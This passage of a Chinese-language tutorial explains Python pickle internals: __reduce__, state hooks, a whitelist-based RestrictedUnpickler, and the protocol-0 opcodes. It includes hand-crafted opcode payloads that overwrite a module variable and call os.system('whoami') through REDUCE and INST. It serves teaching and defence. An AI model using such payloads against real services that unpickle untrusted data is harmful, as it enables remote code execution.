对象</span></span><br><span class="line">obj = CommandExecutor(<span class="string">&quot;echo &#x27;Hello, World!&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化对象</span></span><br><span class="line">serialized_obj = pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化对象并执行命令</span></span><br><span class="line">pickle.loads(serialized_obj)</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+
+    </div>
+  </div>
+
+<h3 id="getstate-setstate"><a href="#getstate-setstate" class="headerlink" title="getstate &#x2F; setstate"></a>getstate &#x2F; setstate</h3><p><code>__getstate__</code> 和 <code>__setstate__</code> 是另外两个方法，它们用于<strong>导出和恢复对象的内部状态</strong>。</p>
+<ul>
+<li><code>__getstate__</code>：序列化时调用，返回对象的状态（通常是属性字典）。</li>
+<li><code>__setstate__</code>：反序列化时调用，用来恢复对象的状态。</li>
+</ul>
+<p>例如，我们可以在 <code>__getstate__</code> 中对对象进行一些处理，过滤掉不必要的数据，或对数据进行压缩。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y, secret_data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line">        <span class="variable language_">self</span>.secret_data = secret_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回需要序列化的属性字典，去除 &#x27;secret_data&#x27;</span></span><br><span class="line">        state = <span class="variable language_">self</span>.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> state[<span class="string">&#x27;secret_data&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="comment"># 恢复对象的属性</span></span><br><span class="line">        <span class="variable language_">self</span>.__dict__.update(state)</span><br><span class="line"></span><br><span class="line">obj = MyClass(<span class="number">10</span>, <span class="number">20</span>, <span class="string">&quot;secret&quot;</span>)</span><br><span class="line">serialized_obj = pickle.dumps(obj)</span><br><span class="line">deserialized_obj = pickle.loads(serialized_obj)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(deserialized_obj.x)  <span class="comment"># 输出 10</span></span><br><span class="line"><span class="built_in">print</span>(deserialized_obj.y)  <span class="comment"># 输出 20</span></span><br><span class="line"><span class="comment"># print(deserialized_obj.secret_data)  # 会抛出 AttributeError</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <ul>
+<li><p><strong><code>__reduce__</code> 是与对象的序列化过程</strong>相关，它返回一个“<strong>配方</strong>”（如 <code>(callable, args_tuple)</code>），这个配方会在 <strong>序列化时</strong> 写进字节流，并且 <strong>反序列化时</strong> 被用来恢复对象。</p>
+</li>
+<li><p><strong><code>__getstate__</code> 和 <code>__setstate__</code> 只与对象的状态有关</strong>，它们<strong>不涉及对象的构建过程</strong>，而是直接<strong>导出和恢复对象的状态</strong>（例如属性、字段等）。</p>
+</li>
+</ul>
+
+    </div>
+  </div>
+
+<h2 id="限制对象加载"><a href="#限制对象加载" class="headerlink" title="限制对象加载"></a>限制对象加载</h2><p>在反序列化时，<code>pickle</code> 遇到某些指令（如 <code>GLOBAL</code> 或 <code>STACK_GLOBAL</code>）时，需要按<strong>模块名 + 对象名</strong>去加载一个全局对象，比如：</p>
+<ul>
+<li><code>GLOBAL</code>（协议 0，<code>c</code>）</li>
+<li><code>STACK_GLOBAL</code>（协议 4，<code>\x93</code>）</li>
+<li><code>REDUCE</code>（间接触发，<code>R</code>）</li>
+</ul>
+<p>这一步是通过 <code>Unpickler.find_class(module, name)</code> 方法完成的。默认实现会直接导入对应模块并取出对象——这也是攻击者可利用的执行点。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="built_in">__import__</span>(module)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure></div>
+
+<p>为了降低风险，可以继承 <code>pickle.Unpickler</code> 并<strong>重写</strong> <code>find_class</code>，在里面做白名单检查：</p>
+<ul>
+<li>只允许加载你指定的安全对象（如 <code>builtins.range</code> 等）；</li>
+<li>其余一律抛出 <code>UnpicklingError</code> 阻止执行。</li>
+</ul>
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>：基础类型（<code>int</code>、<code>list</code>、<code>dict</code> 等）在反序列化时并不会走 <code>find_class</code>，它们由专用的 pickle 指令处理，所以不会被白名单逻辑拦截。这种限制方法<strong>只影响“按名加载”的对象</strong>（即类、函数等可全局引用的对象）。</p>
+
+    </div>
+  </div>
+
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins, io, pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许按“模块名+对象名”加载的内建对象白名单</span></span><br><span class="line"><span class="comment"># ⚠️ 仅影响会触发 find_class 的对象（类/函数等），</span></span><br><span class="line"><span class="comment">#    不影响 int/list/dict 等基础类型的反序列化。</span></span><br><span class="line">safe = &#123;<span class="string">&quot;range&quot;</span>, <span class="string">&quot;complex&quot;</span>, <span class="string">&quot;set&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># 仅允许加载 builtins 中在 safe 白名单里的对象</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># 其余“按名加载”的对象全部禁止</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">f&quot;Global &#x27;<span class="subst">&#123;module&#125;</span>.<span class="subst">&#123;name&#125;</span>&#x27; is forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受限反序列化 helper：只对白名单对象生效</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化：包含基础类型 int、list 以及会触发 find_class 的 builtins.range</span></span><br><span class="line">data = pickle.dumps([<span class="number">1</span>, <span class="number">2</span>, <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化说明：</span></span><br><span class="line"><span class="comment"># - 1、2、以及外层 list 使用专用 opcode，不会触发 find_class，正常恢复</span></span><br><span class="line"><span class="comment"># - range 会触发 find_class，因在白名单内 → 允许</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    obj = restricted_loads(data)</span><br><span class="line">    <span class="built_in">print</span>(obj)  <span class="comment"># 这里会成功打印，而不是报错</span></span><br><span class="line"><span class="keyword">except</span> pickle.UnpicklingError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Unpickling Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p><code>pickle.Unpickler</code> 需要一个“类文件对象”来读取 pickle 流。</p>
+<p>而 <code>io.BytesIO</code> 会把 <strong>bytes 类型</strong>（二进制）的 pickle 数据包装成一个<strong>内存文件对象</strong>，就像用 <code>open()</code> 打开的文件一样可以被读取，只是数据在内存中，不在磁盘里。</p>
+<p><code>load()</code> 是 <code>Unpickler</code> 的方法，会开始从传入的文件对象读取 pickle 数据，逐条解释指令，创建对象，最后返回反序列化结果。</p>
+
+    </div>
+  </div>
+
+<h1 id="Pickle-字节码"><a href="#Pickle-字节码" class="headerlink" title="Pickle 字节码"></a>Pickle 字节码</h1><h2 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h2><p>pickle 的序列化结果是<strong>指令流</strong>（opcode + 参数），反序列化就是一条条解释执行这些指令。其中会涉及到如下概念：</p>
+<ul>
+<li><strong>数据栈（stack）</strong>：用于临时存放构造中的对象、参数等。</li>
+<li><strong>标记（MARK）</strong>：用来圈定一段栈内容，之后用来打包成 list&#x2F;tuple&#x2F;dict 或函数参数。</li>
+<li><strong>备忘录（memo）</strong>：一个索引 → 对象 的字典，用于保存已创建对象，解决<strong>重复引用</strong>和<strong>循环引用</strong>。</li>
+<li><strong>构造路径</strong>：简单对象直接压栈，复杂对象通过 <code>GLOBAL</code>&#x2F;<code>REDUCE</code>&#x2F;<code>BUILD</code> 等组合指令构造。</li>
+</ul>
+<p>pickle 反序列化的大致流程如下：</p>
+<ol>
+<li><strong>初始化 Unpickler</strong><ul>
+<li>反序列化入口是 <code>pickle.Unpickler(file_like).load()</code>。</li>
+<li>这个对象持有：<ul>
+<li><strong>文件流</strong>（pickle 数据源，可以是 <code>BytesIO</code> 内存文件）</li>
+<li><strong>数据栈</strong></li>
+<li><strong>memo</strong></li>
+<li><strong>find_class</strong> 方法（可重写来做白名单）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>逐字节读取指令</strong><ul>
+<li>从 pickle 数据流中读取一个字节（opcode）。</li>
+<li>根据 opcode 类型，可能需要继续读取参数（文本或二进制）。</li>
+</ul>
+</li>
+<li><strong>执行指令</strong><ul>
+<li>如果是常量（<code>NONE</code>、<code>INT</code>、<code>STRING</code> 等）→ 直接构造对象压栈。</li>
+<li>如果是容器（<code>LIST</code>、<code>DICT</code>、<code>TUPLE</code> 等）→ 从最近 <code>MARK</code> 后的栈元素收集打包。</li>
+<li>如果是 <code>GLOBAL</code> → 调用 <code>find_class(module, name)</code> 取出全局对象（通常是类&#x2F;函数）。</li>
+<li>如果是 <code>REDUCE</code> → 从栈取 <code>(callable, args_tuple)</code>，执行 <code>callable(*args)</code>，结果压栈。</li>
+<li>如果是 <code>BUILD</code> → 恢复对象状态（<code>__setstate__</code> 或 <code>__dict__.update</code>）。</li>
+<li>如果是 <code>PUT</code>&#x2F;<code>GET</code> → 在 memo 中存取对象引用。</li>
+</ul>
+</li>
+<li><strong>遇到 STOP</strong><ul>
+<li>返回栈顶对象作为反序列化结果。</li>
+</ul>
+</li>
+</ol>
+<h2 id="字节码指令"><a href="#字节码指令" class="headerlink" title="字节码指令"></a>字节码指令</h2><p>下面<strong>只介绍<code>pickle</code> 协议 0（protocol 0）</strong>的指令集。它是最早的<strong>纯 ASCII 文本协议</strong>：所有参数用可读文本表示并以换行结尾，解释器像“<strong>栈机器</strong>”一样按指令对栈做操作，并用一个<strong>备忘录（memo）</strong>表来处理共享&#x2F;循环引用。</p>
+<h3 id="栈与流程控制指令"><a href="#栈与流程控制指令" class="headerlink" title="栈与流程控制指令"></a>栈与流程控制指令</h3><table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MARK</td>
+<td><code>(</code></td>
+<td>压入标记对象，用于收集一段元素</td>
+<td>无</td>
+<td><code>[...] → [..., ⟂]</code></td>
+</tr>
+<tr>
+<td>STOP</td>
+<td><code>.</code></td>
+<td>结束 pickle，返回栈顶对象</td>
+<td>无</td>
+<td><code>[obj] → return obj</code></td>
+</tr>
+<tr>
+<td>POP</td>
+<td><code>0</code></td>
+<td>弹出一个栈顶元素</td>
+<td>无</td>
+<td><code>[..., x] → [...]</code></td>
+</tr>
+<tr>
+<td>POP_MARK</td>
+<td><code>1</code></td>
+<td>回退到最近的 <code>MARK</code>（把该 <code>MARK</code> 也弹掉）</td>
+<td>无</td>
+<td><code>[..., ⟂, a, b] → [...]</code></td>
+</tr>
+<tr>
+<td>DUP</td>
+<td><code>2</code></td>
+<td>复制栈顶元素</td>
+<td>无</td>
+<td><code>[..., x] → [..., x, x]</code></td>
+</tr>
+</tbody></table>
+<h3 id="常量与标量（文本编码）"><a href="#常量与标量（文本编码）" class="headerlink" title="常量与标量（文本编码）"></a>常量与标量（文本编码）</h3><table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NONE</td>
+<td><code>N</code></td>
+<td>压入 <code>None</code></td>
+<td>无</td>
+<td><code>[...] → [..., None]</code></td>
+</tr>
+<tr>
+<td>INT</td>
+<td><code>I</code></td>
+<td>压入<strong>十进制</strong>整数或布尔</td>
+<td><code>I42\n</code> &#x2F; <code>I01\n</code> &#x2F; <code>I00\n</code></td>
+<td><code>[...] → [..., 42]</code></td>
+</tr>
+<tr>
+<td>LONG</td>
+<td><code>L</code></td>
+<td>压入大整数（文本十进制）</td>
+<td><code>L1234567890\n</code></td>
+<td><code>[...] → [..., big_int]</code></td>
+</tr>
+<tr>
+<td>FLOAT</td>
+<td><code>F</code></td>
+<td>压入浮点数（文本十进制）</td>
+<td><code>F3.14\n</code></td>
+<td><code>[...] → [..., 3.14]</code></td>
+</tr>
+<tr>
+<td>STRING</td>
+<td><code>S</code></td>
+<td>压入<strong>字节串&#x2F;文本的旧式表示</strong>，参数是 <strong>Python <code>repr</code> 风格</strong>（带引号、转义，换行结尾）</td>
+<td><code>S&#39;abc&#39;\n</code></td>
+<td><code>[...] → [..., b&#39;abc&#39;]</code></td>
+</tr>
+<tr>
+<td>UNICODE</td>
+<td><code>V</code></td>
+<td>压入 <strong>Unicode 文本</strong>，参数是 <strong>raw-unicode-escape</strong> 编码</td>
+<td><code>Vabc\n</code></td>
+<td><code>[...] → [..., &quot;abc&quot;]</code></td>
+</tr>
+</tbody></table>
+<h3 id="容器构造指令"><a href="#容器构造指令" class="headerlink" title="容器构造指令"></a>容器构造指令</h3><p>列表构造指令：</p>
+<table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EMPTY_LIST</td>
+<td><code>]</code></td>
+<td>压入空列表</td>
+<td>无</td>
+<td><code>[...] → [..., []]</code></td>
+</tr>
+<tr>
+<td>LIST</td>
+<td><code>l</code></td>
+<td>把从最近 <code>MARK</code> 之后的元素<strong>收集成 list</strong></td>
+<td>无</td>
+<td><code>[..., ⟂, a, b] → [..., [a, b]]</code></td>
+</tr>
+<tr>
+<td>APPEND</td>
+<td><code>a</code></td>
+<td>把栈顶 <code>x</code> 追加到其下方的 list</td>
+<td>无</td>
+<td><code>[..., L, x] → [..., L+[x]]</code></td>
+</tr>
+<tr>
+<td>APPENDS</td>
+<td><code>e</code></td>
+<td>把 <code>MARK</code> 之后的连续元素<strong>批量追加</strong>到其下方的 list</td>
+<td>无</td>
+<td><code>[..., L, ⟂, a, b] → [..., L+[a, b]]</code></td>
+</tr>
+</tbody></table>
+<p>元组构造指令：</p>
+<table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EMPTY_TUPLE</td>
+<td><code>)</code></td>
+<td>压入空元组</td>
+<td>无</td>
+<td><code>[...] → [..., ()]</code></td>
+</tr>
+<tr>
+<td>TUPLE</td>
+<td><code>t</code></td>
+<td>把 <code>MARK</code> 之后的元素<strong>收集成 tuple</strong></td>
+<td>无</td>
+<td><code>[..., ⟂, a, b] → [..., (a, b)]</code></td>
+</tr>
+</tbody></table>
+<p>字典构造指令：</p>
+<table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EMPTY_DICT</td>
+<td><code>&#125;</code></td>
+<td>压入空字典</td>
+<td>无</td>
+<td><code>[...] → [..., &#123;&#125;]</code></td>
+</tr>
+<tr>
+<td>DICT</td>
+<td><code>d</code></td>
+<td>把 <code>MARK</code> 之后按 <strong>k1, v1, k2, v2, …</strong> 的顺序收集成 dict</td>
+<td>无</td>
+<td><code>[..., ⟂, k1, v1, k2, v2] → [..., &#123;k1:v1, k2:v2&#125;]</code></td>
+</tr>
+<tr>
+<td>SETITEM</td>
+<td><code>s</code></td>
+<td>把顶上两项作为 <code>key, value</code> 设置到其下方的 dict</td>
+<td>无</td>
+<td>&#96;[…, D, k, v] → […, D</td>
+</tr>
+<tr>
+<td>SETITEMS</td>
+<td><code>u</code></td>
+<td>把 <code>MARK</code> 之后的若干对 <code>(k, v)</code> 批量设置进其下方的 dict</td>
+<td>无</td>
+<td>&#96;[…, D, ⟂, k1, v1, k2, v2] → […, D</td>
+</tr>
+</tbody></table>
+<h3 id="备忘录（memo）指令"><a href="#备忘录（memo）指令" class="headerlink" title="备忘录（memo）指令"></a>备忘录（memo）指令</h3><table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PUT</td>
+<td><code>p</code></td>
+<td>将栈顶对象存入备忘录（文本索引）</td>
+<td><code>p0\n</code></td>
+<td><code>memo[0] = top</code></td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>g</code></td>
+<td>从备忘录取对象压栈（文本索引）</td>
+<td><code>g0\n</code></td>
+<td><code>push(memo[0])</code></td>
+</tr>
+</tbody></table>
+<h3 id="对象构造与执行"><a href="#对象构造与执行" class="headerlink" title="对象构造与执行"></a>对象构造与执行</h3><table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GLOBAL</td>
+<td><code>c</code></td>
+<td>按模块+名称加载全局对象</td>
+<td><code>&quot;module\nname\n&quot;</code></td>
+<td><code>[...] → [..., find_class(module, name)]</code></td>
+</tr>
+<tr>
+<td>REDUCE</td>
+<td><code>R</code></td>
+<td>调用可调用对象构造新对象</td>
+<td>无</td>
+<td><code>[..., callable, args_tuple] → [..., callable(*args_tuple)]</code></td>
+</tr>
+<tr>
+<td>INST</td>
+<td><code>i</code></td>
+<td>老式类实例化（MARK 收集参数）</td>
+<td><code>&quot;module\nname\n&quot;</code></td>
+<td><code>[..., ⟂, arg1, arg2, ...] → [..., find_class(module, name)(arg1, arg2, ...)]</code></td>
+</tr>
+<tr>
+<td>OBJ</td>
+<td><code>o</code></td>
+<td>老式实例构造（MARK 收集参数）</td>
+<td>无</td>
+<td><code>[..., ⟂, callable, arg1, arg2, ...] → [..., callable(arg1, arg2, ...)]</code></td>
+</tr>
+<tr>
+<td>BUILD</td>
+<td><code>b</code></td>
+<td>恢复对象状态</td>
+<td>无</td>
+<td><code>[..., obj, state] → [..., obj]</code>（对象状态已更新）</td>
+</tr>
+</tbody></table>
+<h3 id="持久化钩子"><a href="#持久化钩子" class="headerlink" title="持久化钩子"></a>持久化钩子</h3><table>
+<thead>
+<tr>
+<th>指令名</th>
+<th>字符</th>
+<th>作用</th>
+<th>参数形式</th>
+<th>栈操作示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PERSID</td>
+<td><code>P</code></td>
+<td>通过 persistent_load 加载对象</td>
+<td><code>pid\n</code></td>
+<td>把<strong>文本持久化 ID</strong>交给 <code>Unpickler.persistent_load(pid)</code> 来解析成对象并压栈</td>
+</tr>
+</tbody></table>
+<h2 id="常见情景"><a href="#常见情景" class="headerlink" title="常见情景"></a>常见情景</h2><h3 id="覆盖全局变量"><a href="#覆盖全局变量" class="headerlink" title="覆盖全局变量"></a>覆盖全局变量</h3><p>以这段代码为例：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name = <span class="string">&#x27;TEST3213qkfsmfo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, secret</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;1&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;before:&#x27;</span>, secret.name)</span><br><span class="line">output = pickle.loads(opcode.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;after:&#x27;</span>, secret.name)</span><br></pre></td></tr></table></figure></div>
+
+<p>执行过程为：</p>
+<ul>
+<li><code>c__main__\nsecret\n</code> → <code>GLOBAL</code>: 调用 <code>find_class(&quot;__main__&quot;, &quot;secret&quot;)</code>，把 <strong><code>__main__</code> 模块中名为 <code>secret</code> 的全局对象</strong> 压栈。<br>⚠️ 这要求在 <code>main.py</code> 里，确实存在一个名为 <code>secret</code> 的全局对象（这里因为 <code>import secret</code>，<code>__main__</code> 的全局命名空间里就有个名字 <code>secret</code> 指向那个<strong>模块对象</strong>）。</li>
+<li><code>(</code> → <code>MARK</code>：打标记，准备“收集一段元素”。</li>
+<li><code>S&#39;name&#39;\n S&#39;1&#39;\n d</code> → 依次把 <code>&#39;name&#39;</code>、<code>&#39;1&#39;</code> 压栈，然后 <code>d</code>（<code>DICT</code>）把 <code>MARK</code> 后的元素收集成字典：<code>&#123;&#39;name&#39;: &#39;1&#39;&#125;</code>。</li>
+<li><code>b</code> → <code>BUILD</code>：对<strong>栈下方那个对象</strong>（也就是第一步拿到的 <code>secret</code> 模块对象）执行<strong>状态恢复</strong>：<ul>
+<li>如果对象定义了 <code>__setstate__</code> 就调用它；</li>
+<li>否则执行 <code>obj.__dict__.update(state)</code>。<br>因为模块对象有 <code>__dict__</code>，于是相当于：<code>secret.__dict__.update(&#123;&#39;name&#39;: &#39;1&#39;&#125;)</code>，从而**覆盖了模块变量 <code>secret.name</code>**。</li>
+</ul>
+</li>
+<li><code>.</code> → <code>STOP</code>：结束。</li>
+</ul>
+<p>对应的栈变化为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[]  </span><br><span class="line">→ [ secret_module ]                    <span class="comment"># c__main__ secret</span></span><br><span class="line">→ [ secret_module, ⟂ ]                 <span class="comment"># (</span></span><br><span class="line">→ [ secret_module, ⟂, <span class="string">&#x27;name&#x27;</span> ]         <span class="comment"># S&#x27;name&#x27;</span></span><br><span class="line">→ [ secret_module, ⟂, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;1&#x27;</span> ]    <span class="comment"># S&#x27;1&#x27;</span></span><br><span class="line">→ [ secret_module, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125; ]     <span class="comment"># d (DICT) 收集成字典</span></span><br><span class="line">→ [ secret_module ]                    <span class="comment"># b (BUILD) 修改 __dict__ 覆盖 name=&#x27;1&#x27;</span></span><br><span class="line">→ <span class="keyword">return</span> secret_module                 <span class="comment"># .</span></span><br></pre></td></tr></table></figure></div>
+
+<p>结果：<code>secret.name</code> 从原值被改为 <code>&#39;1&#39;</code>。</p>
+<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><h4 id="REDUCE-R-路径"><a href="#REDUCE-R-路径" class="headerlink" title="REDUCE (R) 路径"></a><code>REDUCE (R)</code> 路径</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>执行过程为：</p>
+<ul>
+<li><code>c os\n system\n</code> → <code>GLOBAL</code>：压入 <code>os.system</code> 这个可调用对象。</li>
+<li><code>(</code> <code>S&#39;whoami&#39;\n</code> <code>t</code> → <code>MARK</code>+参数+<code>TUPLE</code>：把 <code>&#39;whoami&#39;</code> 打成参数元组 <code>(&#39;whoami&#39;,)</code>。</li>
+<li><code>R</code> → <code>REDUCE</code>：执行 <code>os.system(&#39;whoami&#39;)</code>，把返回值（命令退出码）压栈。</li>
+<li><code>.</code> → 结束、返回退出码。</li>
+</ul>
+<p>对应的栈变化为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[]  </span><br><span class="line">→ [ os.system ]                                <span class="comment"># c os system</span></span><br><span class="line">→ [ os.system, ⟂ ]                             <span class="comment"># (</span></span><br><span class="line">→ [ os.system, ⟂, <span class="string">&#x27;whoami&#x27;</span> ]                   <span class="comment"># S&#x27;whoami&#x27;</span></span><br><span class="line">→ [ os.system, (<span class="string">&#x27;whoami&#x27;</span>,) ]                   <span class="comment"># t (TUPLE)</span></span><br><span class="line">→ [ os.system(<span class="string">&#x27;whoami&#x27;</span>) ]                      <span class="comment"># R (REDUCE)</span></span><br><span class="line">→ <span class="keyword">return</span> result_of_system                      <span class="comment"># .</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="INST-i-路径"><a href="#INST-i-路径" class="headerlink" title="INST (i) 路径"></a><code>INST (i)</code> 路径</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>执行过程为：</p>
+<ul>
+<li><code>(</code> <code>S&#39;whoami&#39;\n</code> → 压入 <code>MARK</code> 和 <code>&#39;whoami&#39;</code> 作为参数。</li>
